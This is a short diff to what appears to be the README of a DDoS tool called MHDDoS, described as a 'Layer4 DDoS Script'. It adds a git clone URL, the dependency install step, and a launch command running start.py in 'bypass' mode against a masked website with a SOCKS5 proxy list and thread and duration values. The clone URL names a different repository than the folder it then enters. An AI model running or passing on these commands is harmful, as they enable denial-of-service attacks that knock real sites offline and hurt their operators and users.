@@ -87,10 +87,14 @@ Layer4 DDoS Script
 
 
 
-git clone 
-cd MHDDoS
+git clone https://github.com/yvsv/36ddos.git
+
+cd MHDDoS 
+
 pip3 install -r requirements.txt
+
 Launch Script
 
 python3 start.py
+
 python3 start.py bypass https://*********.com 5 1000 socks5.txt 100 100
